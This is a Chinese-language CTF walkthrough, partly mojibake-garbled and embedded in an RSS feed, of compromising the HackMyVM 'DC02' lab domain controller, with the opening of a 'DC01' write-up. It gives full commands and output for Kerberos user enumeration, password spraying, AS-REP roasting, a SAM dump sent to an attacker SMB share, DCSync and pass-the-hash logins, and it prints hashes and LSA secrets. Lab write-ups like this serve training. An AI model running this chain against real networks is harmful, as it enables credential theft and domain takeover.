Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-20 02:57:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-server-header: Microsoft-HTTPAPI/2.0
|\_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:F5:A3:8F (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:f5:a3:8f (Oracle VirtualBox virtual NIC)
|\_clock-skew: -40m50s
| smb2-time:
|   date: 2024-11-20T02:58:01
|\_  start\_date: N/A
<br>192.168.56.126:389 open
192.168.56.126:53 open
192.168.56.126:135 open
192.168.56.126:445 open
192.168.56.126:464 open
192.168.56.126:88 open
192.168.56.126:593 open
192.168.56.126:636 open
192.168.56.126:139 open
192.168.56.126:3268 open
192.168.56.126:3269 open
192.168.56.126:5985 open
192.168.56.126:9389 open
192.168.56.126:49667 open
192.168.56.126:49664 open
192.168.56.126:49674 open
192.168.56.126:49687 open
192.168.56.126:49707 open
[\*] alive ports len is: 18
start vulscan
[\*] NetBios 192.168.56.126  [+] DC:SOUPEDECODE\DC01
[\*] WebTitle http://192.168.56.126:5985 code:404 len:315    title:Not Found
[\*] NetInfo
[\*]192.168.56.126
   [-&gt;]DC01
   [-&gt;]192.168.56.126
<br>åŸŸå SOUPEDECODE
<br>å…ˆé…ç½®hosts<br>vim /etc/hosts
192.168.56.126 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
<br><br>ç›®æ ‡å¼€æ”¾äº† 139 445ç«¯å£<br>smbmap æ£€æµ‹ä¸€ä¸‹æ˜¯å¦å­˜åŒ¿åç™»å½•ä¸æ¥å®¾ç™»å½•<br>â”€# smbmap -u anonymous -H SOUPEDECODE.LOCAL

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>å‘ç°ç›®æ ‡å¹¶æ²¡æœ‰å¼€å¯SMB ç©ºä¼šè¯ ä¸LDAPåŒ¿åç™»å½•<br><br>æˆ‘ä»¬åˆ©ç”¨å¸¸è§ç”¨æˆ·åä½œä¸ºå­—å…¸ å¯¹Kerberos èº«ä»½éªŒè¯æ¥æšä¸¾åŸŸä¸­å¯èƒ½å­˜åœ¨çš„ç”¨æˆ·ã€‚<br>kerbrute userenum -d SOUPEDECODE.LOCAL -t 50 --dc DC01.SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o valid\_user.txt

    \_\_             \_\_               \_\_
   / /\_\_\_\_\_  \_\_\_\_\_/ /\_  \_\_\_\_\_\_\_  \_\_/ /\_\_\_\_
  / //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
 / ,&lt; /  \_\_/ /  / /\_/ / /  / /\_/ / /\_/  \_\_/
/\_/|\_|\\_\_\_/\_/  /\_.\_\_\_/\_/   \\_\_,\_/\\_\_/\\_\_\_/

Version: v1.0.3 (9dad6e1) - 11/20/24 - Ronnie Flathers @ropnop

2024/11/20 12:10:37 &gt;  Using KDC(s):
2024/11/20 12:10:37 &gt;   DC01.SOUPEDECODE.LOCAL:88

2024/11/20 12:10:37 &gt;  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2024/11/20 12:10:37 &gt;  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2024/11/20 12:10:40 &gt;  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2024/11/20 12:11:04 &gt;  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
2024/11/20 12:12:02 &gt;  [+] VALID USERNAME:       printserver@SOUPEDECODE.LOCAL
2024/11/20 12:12:57 &gt;  [+] VALID USERNAME:       kleo2@SOUPEDECODE.LOCAL
2024/11/20 12:14:00 &gt;  [+] VALID USERNAME:       dc01@SOUPEDECODE.LOCAL
2024/11/20 12:14:46 &gt;  [+] VALID USERNAME:       aDmin@SOUPEDECODE.LOCAL
2024/11/20 12:15:08 &gt;  [+] VALID USERNAME:       ChArLiE@SOUPEDECODE.LOCAL
2024/11/20 12:15:09 &gt;  [+] VALID USERNAME:       CHarlie@SOUPEDECODE.LOCAL
2024/11/20 12:15:20 &gt;  Done! Tested 8295455 usernames (15 valid) in 282.207 seconds
<br>-d åŸŸå<br>
-t çº¿ç¨‹<br>
--dc DC-o è¾“å‡ºåˆ°æ–‡ä»¶<br>æå–ä¸€ä¸‹ç”¨æˆ·å<br>//æå–å‡ºç”¨æˆ·å å¹¶å…¨éƒ¨è½¬ä¸ºå°å†™
cat valid\_user.txt | grep @ | cut -d " " -f8 | cut -d '@' -f1 | while read a; do echo "$a" | tr '[:upper:]' '[:lower:]' &gt;&gt; valid\_user\_lowercase.txt; done
//å»é‡
cat valid\_user\_lowercase.txt  | sort -u &gt; valid\_usernames.txt
<br><br>è·å–åˆ°äº†ç”¨æˆ·åå•valid_usernames.txt<br>å°è¯•åˆ©ç”¨ç”¨æˆ·åä½œä¸ºå¯†ç è¿›è¡Œå¯†ç å–·æ¶‚<br>--no-bruteforce ç¦ç”¨æš´åŠ›ç ´è§£å°è¯•<br>--continue-on-success åœ¨æˆåŠŸéªŒè¯æŸä¸ªç”¨æˆ·åå’Œå¯†ç åï¼Œç¨‹åºç»§ç»­è¿è¡Œï¼Œä¸ä¼šå› ä¸ºä¸€ä¸ªæˆåŠŸçš„éªŒè¯å°±åœæ­¢æ‰€æœ‰åç»­æ“ä½œ<br>crackmapexec smb SOUPEDECODE.LOCAL -u valid\_usernames.txt -p valid\_usernames.txt --no-bruteforce  --continue-on-success
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\dc01:dc01 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\printserver:printserver STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS\_LOGON\_FAILURE
<br>æˆåŠŸè·å–åˆ°äº†ä¸€ä¸ªç”¨æˆ·çš„å¯†ç <br>charlie:charlie
<br><br><br>crackmapexec smb SOUPEDECODE.LOCAL -u 'charlie' -p 'charlie' --rid-brute &gt; rid\_bruteforce.txt

cat rid\_bruteforce | grep  'SidTypeUser' | cut -d '\' -f2 | cut -d ' ' -f1  &gt; domain\_users.txt
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png" referrerpolicy="no-referrer"><br><br>åˆ©ç”¨impacket-GetNPUsers æšä¸¾ç¦ç”¨ Kerberos é¢„è®¤è¯çš„ç”¨æˆ·ä»¥è·å–å¯ä»¥ç”¨äº ASREPRoasting æ”»å‡»çš„ç”¨æˆ·<br>
ç¦ç”¨é¢„è®¤è¯çš„ç”¨æˆ·ä¼šå‘åŸŸæ§åˆ¶å™¨å‘é€ä¸åŒ…å«åŠ å¯†çš„èº«ä»½éªŒè¯è¯·æ±‚ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æ•è· AS-REP å“åº”å¹¶è¿›è¡Œå¯†ç ç ´è§£ã€‚
<br>åœ¨è¿™ä¹‹å‰éœ€è¦å…ˆå°†æ—¶é—´ä¸åŸŸæ—¶é—´å¯¹é½<br>timedatectl set-ntp off
rdate -n  192.168.56.126
impacket-GetNPUsers  SOUPEDECODE.LOCAL/  -dc-ip 192.168.56.126 -no-pass -usersfile domain\_users.txt | grep -v  '[-]'
<br>impacket-GetNPUsers  SOUPEDECODE.LOCAL/  -dc-ip 192.168.56.126 -no-pass -usersfile domain\_users.txt | grep -v  '[-]'

$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:9db51e4c05b23c0562b08157315f848a$f5b6d13bb1d2dcd2c0f56218183d0c552a69ccde25bea3b39dc4f82002b6a42d05b8753a81230a65f62f6b091be00057d2a2d106a9d9c4e3ac99a70b3071cd822bb3536bf51cb9f94b3b7217594b2fff7baf7a4b195651753b7c9b87148f424f9255eafea3565df4dde77b2abeaa649f4b2b6877044936c66419aec3db1b4a4e066df447176c63f01de9a9ef41b8b846f3ba870a4237e50560dbbeb84d4b0f82afca660940e70ac6693bf7c82ffcba601384a110498dd4b7e5f7b4ca761830c8ff04b18dea82abf62c62bd00ab9948561b4ff09daf864b94745170d4239da474d8d016f72bb84ec0efa4147dc7eb6e4c327b8e9b0308
<br><br>æˆ‘ä»¬è·å–åˆ°zximena448ç”¨æˆ·çš„ AS-REP å“åº”çš„åŠ å¯†å¯†ç å“ˆå¸Œ<br>å®ƒåŒ…å«äº†ç›®æ ‡ç”¨æˆ·çš„ Kerberos å¯†ç <br>æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨hashcatå¯¹å…¶è¿›è¡Œç ´è§£ä»¥è·å–ç”¨æˆ·å¯†ç <br>hashcat -a 0 -m 18200 as-rep.txt rockyou.txt
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.002.png" referrerpolicy="no-referrer"><br>æˆåŠŸçˆ†ç ´å‡ºå¯†ç internet<br><br>åˆ©ç”¨zximena448ç”¨æˆ·ä¸å¯†ç  æ”¶é›†åŸŸå†…ä¿¡æ¯<br>åœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆç”¨ dnschef è®¾ç½®ä¸€ä¸ªè™šå‡çš„ DNS æœåŠ¡å™¨å¹¶è¿è¡Œ Bloodhoundï¼Œç„¶ååœ¨è¿è¡Œ BloodHound æ—¶è®©å®ƒä½¿ç”¨å‡çš„ DNS æœåŠ¡å™¨ IP è¿›è¡ŒåŸŸåè§£æã€‚è¿™æ ·å¯ä»¥å¸®æˆ‘ä»¬è·å–æ›´å¤šçš„ä¿¡æ¯<br>dnschef --fakeip 192.168.56.126
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.003.png" referrerpolicy="no-referrer"><br>æ”¶é›†åŸŸå†…ä¿¡æ¯<br>bloodhound-python  -u 'zximena448' -p 'internet' -ns 127.0.0.1 -d SOUPEDECODE.LOCAL  -dc DC01.SOUPEDECODE.LOCAL   --zip
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.004.png" referrerpolicy="no-referrer"><br> å¯åŠ¨neo4j  ç„¶åç”¨Bloodhood GUI å¯¹è·å–çš„å‹ç¼©åŒ…è¿›è¡Œåˆ†æ<br>ä¸Šä¼ å‹ç¼©åŒ…é‡Œé¢çš„jsonæ–‡ä»¶<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.005.png" referrerpolicy="no-referrer"><br>æ‰¾åˆ°æˆ‘ä»¬å½“å‰çš„ç”¨æˆ·zximena448<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.006.png" referrerpolicy="no-referrer"><br>æˆ‘ä»¬å¯ä»¥å‘ç°zximena448ç”¨æˆ·æ˜¯backup operator ç»„çš„æˆå‘˜ã€‚<br>æ­¤ç»„å¯ä»¥å¤‡ä»½å­˜å‚¨å‡­æ®çš„ SAM æ•°æ®åº“ã€‚ä½†ç”±äºè¯¥ç”¨æˆ·æ— æ³•ç™»å½•  DC01ï¼Œæˆ‘ä»¬ç”¨ Impacket å·¥å…·è¿œç¨‹å¤‡ä»½æ­¤æ•°æ®åº“ã€‚æˆ‘ä»¬éœ€è¦å…ˆå¯åŠ¨ä¸€ä¸ª SMB æœåŠ¡å™¨ï¼Œç„¶åå°†SAMæ•°æ®åº“å¤‡ä»½ä»æœåŠ¡å™¨ä¸Šä¼ åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºã€‚<br><br>åœ¨å½“å‰ç›®å½•å¯åŠ¨ä¸€ä¸ª SMB æœåŠ¡å™¨ å¹¶æŒ‚åˆ°åå°<br>impacket-smbserver -smb2support share . &amp;
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[\*] Config file parsed
[\*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[\*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[\*] Config file parsed
[\*] Config file parsed
[\*] Config file parsed
<br>è®¾ç½® SMB æœåŠ¡å™¨åï¼Œæˆ‘ä»¬åˆ©ç”¨impacket-reg å·¥å…·è¿œç¨‹å¤‡ä»½SAMæ³¨å†Œè¡¨é¡¹ã€‚<br>impacket-reg -dc-ip 192.168.56.126 SOUPEDECODE.LOCAL/zximena448:internet@192.168.56.126  backup -o '\\192.168.56.6\share' 
<br>ç„¶åä½¿ç”¨impacket-secretsdump è½¬å‚¨è¿™ä¸ªSAMå¤‡ä»½çš„å†…å®¹<br>impacket-secretsdump -sam SAM.save  -system SYSTEM.save -security SECURITY.save LOCAL 

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[\*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[\*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[\*] Dumping cached domain logon information (domain/username:hash)
[\*] Dumping LSA Secrets
[\*] $MACHINE.ACC
$MACHINE.ACC:plain\_password\_hex:30d0ca9ed25597562013a17fe07bcc24a8063aa89da83698090451d4f9c01497d07956aee9f517760560ca9817836b8aaa5a0706c8e3d358c8248d48c5c42388c80af03a4c70c4e75a55066bbc2ea68747c758fe4e41e80a4a6a2d9c9bd68c94ebc3e8fbbc89d06985163c8de5071d80a1c55c33a83b3c006c123eae6c0e5706412271e110ae7fd8e39482ae539bb6f9441b2340dbcd8fb1593198b778f09317469e8dd572d14e42031997298f68ec498f5bb6a2c295cd7c9dbadfcb88f74e7e0cb5b25b39ca43d970cb8c1b5b506c316438d7de4c8d0d6b1ac2f2985ef7eb35e0951cff704cae50ac45eff772a29f9e
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:f984aa0aa19fcb118d6b20506ce75c6d
[\*] DPAPI\_SYSTEM
dpapi\_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi\_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[\*] NL$KM
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU&gt;...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[\*] Cleaning up...
<br>å‘ç°è¿™é‡Œé¢æœ‰Administratorç”¨æˆ·çš„hash<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
<br>å°è¯•èƒ½ä¸èƒ½ä½¿ç”¨è¿™ä¸ªhashè¿›è¡Œç™»å½•<br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'Administrator' -H 209c6174da490caeb422f3fa5a7ae634
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:209c6174da490caeb422f3fa5a7ae634 STATUS\_LOGON\_FAILURE
<br>ç™»å½•å¤±è´¥äº†<br>æ²¡å…³ç³»æˆ‘ä»¬è¿˜æœ‰æœºå™¨è´¦æˆ·çš„hash ($MACHINE.ACC)<br>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:f984aa0aa19fcb118d6b20506ce75c6d
<br><br>è¿›è¡Œå¯†ç å–·å°„ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è·å–ç›®æ ‡çš„æ‰€æœ‰æœºå™¨è´¦æˆ·åˆ—è¡¨<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Bloodhoodæ”¶é›†çš„å‹ç¼©åŒ…é‡Œé¢çš„computer.jsonæ–‡ä»¶è·å–<br>unzip 20241120140128\_bloodhound.zip
cat 20241120140128\_computers.json | jq .  | grep samaccountname | cut -d '"' -f4 &gt; machines.txt
<br>ä½¿ç”¨ CrackMapExec è¿›è¡Œå¯†ç å–·å°„<br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u machines.txt  -H f984aa0aa19fcb118d6b20506ce75c6d | grep -v '[-]'
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:f984aa0aa19fcb118d6b20506ce75c6d
<br><br>é€šè¿‡å¯†ç å–·å°„ æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªhashæ˜¯æœºå™¨è´¦æˆ·DC01$çš„<br>åˆ©ç”¨bloodhood GUI å¯¹DC01$è¿›è¡Œåˆ†æ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.006.png" referrerpolicy="no-referrer"><br>å¯ä»¥çœ‹åˆ°DC01$ æ˜¯ Administrator ç»„çš„æˆå‘˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­¤ç»„æˆå‘˜èº«ä»½æƒé™å¯¹åŸŸæ§åˆ¶å™¨æ‰§è¡Œ DCSync æ”»å‡»ã€‚<br>
åœ¨Enterprise Admin ç»„ ä¹Ÿå¯ä»¥è¿›è¡ŒDCSyncæ”»å‡»èƒ½å¤Ÿæ‰§è¡Œèƒ½å¤Ÿæ‰§è¡Œ replication synchronization æƒé™ ä¹Ÿå¯ä»¥
<br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'DC01$' -H f984aa0aa19fcb118d6b20506ce75c6d --ntds &gt;ntds.txt  
<br>--ntds  è·å–NTDS.dit æ–‡ä»¶çš„å†…å®¹è¿™ä¸ªæ–‡ä»¶æ˜¯ Windows åŸŸæ§çš„ Active Directory æ•°æ®åº“ï¼ŒåŒ…å«äº†æ‰€æœ‰åŸŸè´¦æˆ·çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯†ç å“ˆå¸Œã€Kerberos å¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯<br>ç®¡ç†å‘˜çš„hash<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
<br><br>æˆ‘ä»¬å·²ç»è½¬å‚¨äº†åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å‡­è¯ã€‚åˆ©ç”¨ç®¡ç†å‘˜çš„å“ˆå¸Œå€¼é€šè¿‡ WinRm åœ¨æœ¬åœ°ç™»å½•åˆ°åŸŸæ§è·å–flag<br>evil-winrm -i 192.168.56.126 -u Administrator -H 8982babd4da89d33210779a6c5b078bd 
<br>\*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\zximena448\Desktop\user.txt
2fe79eb0e02ecd4dd2833cfcbbdb504c

\*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
d41d8cd98f00b204e9800998ecf8427e
<br>å‚è€ƒwp:<a rel="noopener nofollow" class="external-link" href="https://christelise.github.io/posts/dc02-walkthrough/" target="_blank">https://christelise.github.io/posts/dc02-walkthrough/</a>]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/21.dc02.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/21.DC02.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[20.DC01]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. SMB" data-href="#3. SMB" href="https://www.c1trus.top/about:blank#3._SMB" class="internal-link" target="_self" rel="noopener nofollow">3. SMB</a>
<br><a data-tooltip-position="top" aria-label="4. SMBå¯†ç å–·å°„" data-href="#4. SMBå¯†ç å–·å°„" href="https://www.c1trus.top/about:blank#4._SMBå¯†ç å–·å°„" class="internal-link" target="_self" rel="noopener nofollow">4. SMBå¯†ç å–·å°„</a>
<br><a data-tooltip-position="top" aria-label="5. hashcatç ´è§£" data-href="#5. hashcatç ´è§£" href="https://www.c1trus.top/about:blank#5._hashcatç ´è§£" class="internal-link" target="_self" rel="noopener nofollow">5. hashcatç ´è§£</a>
<br><a data-tooltip-position="top" aria-label="6. smbæ£€æµ‹ä¸€ä¸‹" data-href="#6. smbæ£€æµ‹ä¸€ä¸‹" href="https://www.c1trus.top/about:blank#6._smbæ£€æµ‹ä¸€ä¸‹" class="internal-link" target="_self" rel="noopener nofollow">6. smbæ£€æµ‹ä¸€ä¸‹</a>
<br><a data-tooltip-position="top" aria-label="7. smbclientè¿æ¥" data-href="#7. smbclientè¿æ¥" href="https://www.c1trus.top/about:blank#7._smbclientè¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">7. smbclientè¿æ¥</a>
<br><a data-tooltip-position="top" aria-label="8. WinRM è¿æ¥DC01" data-href="#8. WinRM è¿æ¥DC01" href="https://www.c1trus.top/about:blank#8._WinRM_è¿æ¥DC01" class="internal-link" target="_self" rel="noopener nofollow">8. WinRM è¿æ¥DC01</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=DC01
<br><a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=josemlwdf" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=josemlwdf" target="_blank">josemlwdf</a><br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šSMBåŒ¿åç™»å½•ã€RIDæšä¸¾ã€SPN
<br>å¥½ä¹…æ²¡æ‰“windwosé¶æœºäº†ã€‚è¿™æ˜¯æˆ‘åœ¨hackmyvmä¸Šæ‰“çš„ç¬¬ä¸€ä¸ªwindowsé¶æœº
<br><br>192.168.56.128:445 open
192.168.56.128:88 open
192.168.56.128:139 open
192.168.56.128:135 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.128  [+] DC:SOUPEDECODE\DC01
[\*] NetInfo
[\*]192.168.56.128
   [-&gt;]DC01
   [-&gt;]192.168.56.128
<br>nmap -sC -sV 192.168.56.128 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 13:03 CST
Nmap scan report for 192.168.56.128
Host is up (0.00030s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-19 20:05:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-title: Not Found
|\_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:08:32:AA (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:08:32:aa (Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2024-11-19T20:05:57
|\_  start\_date: N/A
|\_clock-skew: 14h59m58s
<br>å¯ä»¥å‘ç°ç›®æ ‡è¿è¡Œçš„æœåŠ¡æœ‰Kerberosã€LDAPã€SMB è¿™äº›éƒ½æ˜¯windowsåŸŸæ§çš„ç‰¹å¾<br>åŸŸå SOUPEDECODE 
